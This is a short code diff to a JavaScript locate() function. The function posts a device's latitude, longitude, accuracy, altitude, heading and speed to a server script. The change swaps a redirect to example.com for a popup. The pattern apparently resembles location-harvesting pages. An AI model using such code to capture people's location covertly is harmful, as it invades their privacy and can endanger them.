@@ -23,7 +23,7 @@ function locate()
       type: 'POST',
       url: '/php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){window.location='http://example.com';},
+      success: function(){popup();},
       mimeType: 'text'
     });
   };
